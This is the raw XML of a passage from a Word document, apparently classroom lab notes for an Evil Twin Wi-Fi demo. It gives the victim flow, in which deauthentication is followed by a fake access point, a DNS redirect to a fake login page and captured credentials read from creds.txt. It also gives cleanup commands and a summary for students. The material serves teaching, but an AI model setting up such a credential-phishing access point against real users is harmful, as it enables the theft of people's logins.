        </w:rPr>
        <w:t>sudo systemctl start apache2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24772671">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F19CA24">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="403F79A2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Check page:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF33E75">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DB46CCF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>firefox http://192.168.10.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766AE560">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F2A000B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>📱 Step 6: Victim Flow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744A6B12">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2916750B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Victim is disconnected from real Wi-Fi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B8A33B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="522789E7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Sees Evil Twin AP (same SSID).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3E6FFB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B00390E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Connects → gets IP via dnsmasq.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3633D6D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11EE87E7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Any website → DNS redirect → Fake login page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73351964">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C41C14C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Credentials captured in:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFDF0D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A1BD4D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>cat /var/www/html/creds.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="645DE7F4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51935054">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>🧹 Step 7: Cleanup (after demo)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73847094">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo systemctl stop apache2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2154C8C7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo pkill dnsmasq</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5699E9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo pkill hostapd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC8FAFF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo airmon-ng stop wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE3E8CA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>sudo systemctl restart NetworkManager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1125CFFD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F2F9D26">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>✅ Key Points for Students</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491FD1DA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00E8AAAE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>First-time manual is setup (configs, fake portal creation).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E873D8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47243E66">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Repeat manual is just restarting services in sequence:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F8DDF0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73D33DC5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Adapter → Monitor Mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08171889">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6247578A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Deauth (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30795E2A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F973D56">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Hostapd (AP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="376D77DD">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03DBD7E9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Dnsmasq (DHCP/DNS redirect)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103C2C3E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B0BA18D">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>Apache (fake login page)</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:sectPr>
      <w:type w:val="continuous"/>
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="1298" w:right="1300" w:bottom="278" w:left="1825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310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6310F0"/>
    <w:rsid w:val="3E810346"/>
    <w:rsid w:val="62D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kern w:val="2"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="en-IN" w:eastAsia="en-US" w:bidi="ar-SA"/>
      <w14:ligatures w14:val="standardContextual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2025-09-01T06:08:00Z</dcterms:created>
  <dc:creator>mcviv</dc:creator>
  <cp:lastModifiedBy>Veera</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-09-01T06:09:40Z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A2B5CD29A0434098BC348F06491BB132_11</vt:lpwstr>
  </property>
</Properties>
</file>